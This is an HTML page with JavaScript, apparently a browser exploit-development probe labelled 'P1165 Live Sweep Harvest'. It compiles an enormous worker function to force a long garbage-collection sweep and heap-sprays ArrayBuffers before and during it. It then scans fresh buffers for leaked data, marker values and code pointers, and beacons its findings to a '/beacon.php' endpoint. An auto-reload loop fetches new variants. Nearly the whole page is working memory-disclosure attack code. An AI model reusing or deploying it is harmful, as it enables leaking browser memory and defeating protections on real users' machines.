<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1165 - Live Sweep Harvest</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
h2{color:#00ff88;font-size:14px;margin:6px 0}
#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<h2>P1165 Live Sweep Harvest (pre-spray window + during-sweep alloc)</h2>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),T0=Date.now();
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1165-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* crash-proof find persistence: prior boot's finds re-beaconed now */
var finds=[];
try{var pf=localStorage.getItem('p1165_finds');if(pf){finds=JSON.parse(pf);
  B('PREV-FINDS','n='+finds.length+'|'+JSON.stringify(finds).slice(0,800));}}catch(e){}
if(!Array.isArray(finds))finds=[];

var attempt=0;
try{attempt=parseInt(localStorage.getItem('p1165_att')||'0');}catch(e){}
try{localStorage.setItem('p1165_att',''+(attempt+1));}catch(e){}
B('BOOT','attempt='+attempt);

if(attempt>=2){
  B('IDLE','2 attempts done');
  log('=== IDLE ===','ok');
  try{localStorage.removeItem('p1165_att');}catch(e){}
}else{

var N_TARGET=38348816;
var CHUNK=4000000;
var CHUNKS=Math.floor(N_TARGET/CHUNK);
var REM=N_TARGET-CHUNKS*CHUNK;
var preAbs=[];  /* 150MB pre-spray (extends sweep window) */
var liveAbs=[]; /* allocated DURING sweep (above buffer = in path) */
var liveIdx=0;
var goSent=false;
var lastB=0;

function buildBlob(){
  var t0=Date.now();
  var parts=[];
  parts.push('self.__v141fn=function(a){');
  for(var c=0;c<CHUNKS;c++){
    parts.push('a();'.repeat(CHUNK));
    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
  }
  if(REM>0)parts.push('a();'.repeat(REM));
  parts.push('};self.postMessage({t:"compiled"});');
  var blob=new Blob(parts,{type:'application/javascript'});
  parts=null;
  B('BLOB','ms='+(Date.now()-t0));
  return URL.createObjectURL(blob);
}

function storeFind(f){
  finds.push(f);
  try{localStorage.setItem('p1165_finds',JSON.stringify(finds.slice(-10)));}catch(e){}
  B('FIND',JSON.stringify(f).slice(0,500));
  log('*** FIND: '+JSON.stringify(f).slice(0,300)+' ***','hit');
}

/* deep scan ONE ab fully: alignment-agnostic sig scan + code pointer read */
function deepScan(ab,i){
  var dv=new DataView(ab);
  var len=ab.byteLength;
  var nzQ=0,firstNZ='';
  for(var q=0;q+7<len;q+=8){
    var lo=dv.getUint32(q,true),hi=dv.getUint32(q+4,true);
    if(lo||hi){nzQ++;if(!firstNZ)firstNZ='q'+q+'='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');}
  }
  var sigs=[];
  for(var p=0;p+28<len;p+=4){
    if(dv.getUint32(p,true)===0xFFFFFFFF){
      var cpLo=dv.getUint32(p+12,true),cpHi=dv.getUint32(p+16,true);
      var idx=dv.getUint32(p+56,true);
      sigs.push('p='+p+'|cp='+cpHi.toString(16).padStart(8,'0')+cpLo.toString(16).padStart(8,'0')+'|idx='+idx);
      if(sigs.length>=3)break;
    }
  }
  storeFind({i:i,nz:nzQ,first:firstNZ,sigs:sigs});
  return nzQ;
}

/* poll live ABs (first 1KB) every 15ms */
function poll(){
  if(!goSent)return;
  var end=Math.min(liveIdx+30,liveAbs.length);
  var hit=false;
  for(var i=liveIdx;i<end&&!hit;i++){
    var ab=liveAbs[i];
    if(!ab)continue;
    var dv=new DataView(ab);
    for(var q=0;q<128;q++){
      var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
      if(lo||hi){
        deepScan(ab,i);
        hit=true;break;
      }
    }
    liveIdx=i+1;
  }
  if(!hit&&Date.now()-lastB>700){
    lastB=Date.now();
    B('POLL','live='+liveAbs.length+'|scanned='+liveIdx+'|finds='+finds.length);
  }
  setTimeout(poll,15);
}

/* continuous 100KB allocation during sweep */
function liveAllocLoop(){
  var ticks=0;
  var iv=setInterval(function(){
    if(ticks>=400){clearInterval(iv);return;}  /* 20/s x 20s max */
    ticks++;
    for(var k=0;k<20;k++){
      liveAbs.push(new ArrayBuffer(100*1024));
    }
  },50);
}

/* worker */
var blobUrl=buildBlob();
var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
  'self.onmessage=function(m){if(m.data==="go"){'+
  'try{self.__v141fn(function(){ });}'+
  'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
var worker=new Worker(wUrl);
worker.__compiled=false;
worker.onmessage=function(m){
  if(m.data&&m.data.t==='compiled'){
    worker.__compiled=true;
    B('WORKER-COMPILED','ok');
    setTimeout(function(){
      /* pre-spray: 1500x100KB */
      var t0=Date.now();
      for(var i=0;i<1500;i++)preAbs.push(new ArrayBuffer(100*1024));
      B('PRE-SPRAY','n='+preAbs.length+'|ms='+(Date.now()-t0));
      setTimeout(function(){
        goSent=true;
        B('GO','sweep start');
        log('=== GO ===','warn');
        poll();
        liveAllocLoop();
        worker.postMessage('go');
        setTimeout(function(){
          B('SURVIVED','live='+liveAbs.length+'|finds='+finds.length);
          B('DONE','survived');
        },25000);
      },300);
    },300);
  }
  else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
};
B('WORKER','created');

setTimeout(function(){
  if(!goSent){B('TIMEOUT','no go');B('DONE','timeout');}
},90000);

} /* attempts */

/* auto-reload checker */
(function(){
  var cur='P1165-live-harvest';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
